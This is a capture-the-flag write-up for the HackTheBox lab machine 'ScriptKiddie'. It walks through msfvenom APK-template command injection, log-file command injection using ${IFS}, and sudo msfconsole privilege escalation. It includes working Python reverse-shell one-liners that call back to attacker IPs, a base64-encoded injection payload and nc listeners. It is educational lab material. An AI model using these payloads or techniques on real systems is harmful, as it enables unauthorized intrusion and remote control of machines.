## ScriptKiddie | HackTheBox

### 1. Scan
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -A -p- -T4 10.10.10.226  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-06 19:35 EST
Nmap scan report for 10-10-10-226.tpgi.com.au (10.10.10.226)
Host is up (0.014s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=3/6%OT=22%CT=1%CU=35174%PV=Y%DS=2%DC=T%G=Y%TM=60442023
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   12.08 ms 10.10.14.1
2   12.09 ms 10-10-10-226.tpgi.com.au (10.10.10.226)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.89 seconds
```
The machine is running SSH and a Werkzeug httpd server through Python.

### 2. Check out webpage
The webpage provides three functionalities. Scan ports on an IP with nmap, generate msfvenom reverse TCP payloads to download and do a search on searchsploit and return the results.  
Each command results in output back onto the page. For an msfvenom payload it is:
```bash
    payload: windows/meterpreter/reverse_tcp
    LHOST: 192.168.34.141
    LPORT: 4444
    template: None
    download: cf7438a74426.exe
    expires: 5 mins
```
nmap and searchsploit just show the terminal output. After perfoming checks for command injection in the text fields, there doesn't appear to be any way to exploit nmap or searchsploit. However, the msfvenom tool also allows for a template to be uploaded. Through this it might be possible to execute commands.

### 3. Get a shell
References:
- https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md  
- https://www.exploit-db.com/exploits/49491  
Firstly I need to generate an apk with an embedded malicious command. I decide to go with a python3 reverse shell.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 49491.py          
[+] Manufacturing evil apkfile
Payload: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.17",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' : cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjE3Iiw5OTk5KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn
-dname: CN='|echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjE3Iiw5OTk5KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn | base64 -d | sh #

  adding: empty (stored 0%)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.

[+] Done! apkfile is at /tmp/tmpggvfeuyc/evil.apk
Do: msfvenom -x /tmp/tmpggvfeuyc/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```
The resulting apk file gets added as a template when generating an android msfvenom payload. Send the request and wait, then get the connection back in the listener.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.226] 51982
/bin/sh: 0: can't access tty; job control turned off
$ id    
uid=1000(kid) gid=1000(kid) groups=1000(kid)
```

### 4. Enumerate from user
Before I start enumeration I generate an ssh key and add it to the user's authorized_keys file so I can login over ssh.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -i id_rsa kid@10.10.10.226
The authenticity of host '10.10.10.226 (10.10.10.226)' can't be established.
ECDSA key fingerprint is SHA256:pALlCiXAy3vx09h2utAwb6w3wp7TNNn0qxANXYRvqu0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.226' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-65-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Mar  7 02:26:18 UTC 2021

  System load:             0.0
  Usage of /:              30.0% of 17.59GB
  Memory usage:            42%
  Swap usage:              0%
  Processes:               261
  Users logged in:         1
  IPv4 address for ens160: 10.10.10.226
  IPv6 address for ens160: dead:beef::250:56ff:feb9:6498


1 update can be installed immediately.
1 of these updates is a security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Mar  7 01:29:19 2021 from 10.10.14.23
kid@scriptkiddie:~$ ls -R
.:
html  logs  snap  user.txt

./html:
__pycache__  app.py  index.html  static  templates

./html/__pycache__:
app.cpython-38.pyc

./html/static:
hacker.css  payloads

./html/static/payloads:

./html/templates:
index.html

./logs:
hackers

./snap:
lxd

./snap/lxd:
19032  common  current

./snap/lxd/19032:

./snap/lxd/common:
```
Some interesting output from Linpeas:
```bash
[+] Files inside others home (limit 20)
/home/pwn/.bash_logout                                                                                                                                                                  
/home/pwn/.selected_editor
/home/pwn/.bashrc
/home/pwn/.profile
/home/pwn/.msf4/history
/home/pwn/.msf4/store/modules_metadata.json
/home/pwn/.msf4/logs/production.log
/home/pwn/.msf4/logs/framework.log
/home/pwn/scanlosers.sh
```
The source code to the web application is in the user's home directory. It's a flask app.
```python
import datetime
import os
import random
import re
import subprocess
import tempfile
import time
from flask import Flask, render_template, request
from hashlib import md5
from werkzeug.utils import secure_filename


regex_ip = re.compile(r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
regex_alphanum = re.compile(r'^[A-Za-z0-9 \.]+$')
OS_2_EXT = {'windows': 'exe', 'linux': 'elf', 'android': 'apk'}

app = Flask(__name__)


@app.route('/', methods=['GET','POST'])
def index():
    if request.method == 'GET' or not 'action' in request.form:
        return render_template('index.html')
    elif request.form['action'] == 'scan':
        return scan(request.form['ip'])
    elif request.form['action'] == 'generate':
        return venom(request)
    elif request.form['action'] == 'searchsploit':
        return searchsploit(request.form['search'], request.remote_addr)
    print("no valid action")
    return request.form


def scan(ip):
    if regex_ip.match(ip):
        if not ip == request.remote_addr and ip.startswith('10.10.1') and not ip.startswith('10.10.10.'):
            stime = random.randint(200,400)/100
            time.sleep(stime)
            result = f"""Starting Nmap 7.80 ( https://nmap.org ) at {datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M")} UTC\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds""".encode()
        else:
            result = subprocess.check_output(['nmap', '--top-ports', '100', ip])
        return render_template('index.html', scan=result.decode('UTF-8', 'ignore'))
    return render_template('index.html', scanerror="invalid ip")


def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")


def venom(request):
    errors = []
    file = None
    if not 'lhost' in request.form:
        errors.append('lhost missing')
    else:
        lhost = request.form['lhost']
        if not regex_ip.match(lhost):
            errors.append('invalid lhost ip')
    if not 'os' in request.form:
        errors.append('os missing')
    else:
        tar_os = request.form['os']
        if tar_os not in ['windows', 'linux', 'android']:
            errors.append(f'invalid os: {tar_os}')
    if 'template' in request.files and request.files['template'].filename != '':
        file = request.files['template']
        if not ('.' in file.filename and file.filename.split('.')[-1] == OS_2_EXT[tar_os]):
            errors.append(f'{tar_os} requires a {OS_2_EXT[tar_os]} ext template file')
        else:
            template_name = secure_filename(file.filename)
            template_ext = file.filename.split('.')[-1]
            template_file = tempfile.NamedTemporaryFile('wb', suffix='.'+template_ext)
            file.save(template_file.name)
    else:
        template_name = "None"

    if errors:
        return render_template('index.html', payloaderror='<br/>\n'.join(errors))

    payload = f'{tar_os}/meterpreter/reverse_tcp'
    outfilename = md5(request.remote_addr.encode()).hexdigest()[:12] + '.' + OS_2_EXT[tar_os]
    outfilepath = os.path.join(app.root_path, 'static', 'payloads', outfilename)

    try:
        if file:
            print(f'msfvenom -x {template_file.name} -p {payload} LHOST={lhost} LPORT=4444')
            result = subprocess.check_output(['msfvenom', '-x', template_file.name, '-p',
                payload, f'LHOST={lhost}', 'LPORT=4444',
                '-o', outfilepath])
            template_file.close()
        else:
            result = subprocess.check_output(['msfvenom', '-p', payload,
                f'LHOST={lhost}', 'LPORT=4444', '-o', outfilepath])
    except subprocess.CalledProcessError:
        return render_template('index.html', payloaderror="Something went wrong")

    
    return render_template('index.html', payload=payload, lhost=lhost,
            lport=4444, template=template_name, fn=outfilename)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
Most interestingly is what happens if the program detects invalid input to searchsploit:
```python
...
else:
    with open('/home/kid/logs/hackers', 'a') as f:
        f.write(f'[{datetime.datetime.now()}] {srcip}\n')
    return render_template('index.html', sserror="stop hacking me - well hack you back")
```
This file is picked up by scanlosers.sh in the pwn user's directory:
```bash
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```
To see the functionality of this in real time I follow the file, and then provide some invalid input to searchsploit.
```bash
kid@scriptkiddie:~/logs$ tail -f hackers
[2021-03-07 03:03:33.888872] 10.10.14.17
tail: hackers: file truncated
```
The file's input is immediately removed after being added in. The pwn user's script takes this output and gets the IP address from it, then performs an nmap scan of the first 10 ports.
```bash
┌──(kali㉿kali)-[~]
└─$ echo "[2021-03-07 03:03:33.888872] 10.10.14.17" | cut -d' ' -f3- | sort -u
10.10.14.17
```
The final line in the file removes all input from it. This effectively means that the pwn user's script will execute a command containing any piece of input that is in the log file. This log file is contained within kid's directory, meaning the current user should be able to write to it.
```bash
kid@scriptkiddie:~/logs$ ls -la
total 8
drwxrwxrwx  2 kid kid 4096 Mar  7 01:31 .
drwxr-xr-x 11 kid kid 4096 Mar  7 01:31 ..
-rw-rw-r--  1 kid pwn    0 Mar  7 03:13 hackers
```
I can test if the script will execute my injected code by echoing some input into a file.
```bash
kid@scriptkiddie:~/logs$ echo ";whoami>/home/pwn/aa;" >> hackers
kid@scriptkiddie:~/logs$ ls /home/pwn
aa  recon  scanlosers.sh
kid@scriptkiddie:~/logs$ cat /home/pwn/aa
pwn
```
It's tricky, because I can't have any spaces in the input without it getting discarded, as the script only takes the first complete line. To get around this I used the `{$IFS}` whitespace variable.
```bash
kid@scriptkiddie:~/logs$ echo ";\$\{IFS\}id\$\{IFS\}>/home/pwn/bb;" >> hackers
kid@scriptkiddie:~/logs$ cat /home/pwn/bb
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
```
With this technique I should be able to move and take over this account.

### 5. Lateral movement
After lengthy experimentation, I finally find a way to get a shell as the pwn user. Using two commands, I create a python file in the user's directory and run it.
```bash
kid@scriptkiddie:~/logs$ echo ";\$\{IFS\}echo\$\{IFS\}'import'\$\{IFS\}'socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.32\",9999));os.dup2(s.fileno(),0);'\$\{IFS\}'os.dup2(s.fileno(),1);'\$\{IFS\}'os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'>/home/pwn/runme.py;" >> hackers
kid@scriptkiddie:~/logs$ cat /home/pwn/runme.py 
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.32",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

echo ";\$\{IFS\}python3\$\{IFS\}/home/pwn/runme.py;" >> hackers
```
Catch the shell in the nc listener.
```bash
┌──(kali㉿kali)-[~/Desktop/htb/scriptkiddie]
└─$ nc -lvnp 9999                              
listening on [any] 9999 ...
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.226] 34074
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
```

### 6. Enumerate from other user
Check sudo permissions:
```bash
pwn@scriptkiddie:~/recon$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```
The pwn user can run msfconsole as root.

### 7. Escalate to root
Through the msfconsole I can execute ordinary shell commands. I can also just straight-up run bash and get a root shell.
```bash
pwn@scriptkiddie:~/recon$ sudo /opt/metasploit-framework-6.0.9/msfconsole
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Metasploit can be configured at startup, see msfconsole --help to learn more

msf6 > whoami
whoami
[*] exec: whoami

root
msf6 > /bin/bash                                                               
/bin/bash
[*] exec: /bin/bash

root@scriptkiddie:/home/pwn/recon# id
id
uid=0(root) gid=0(root) groups=0(root)
```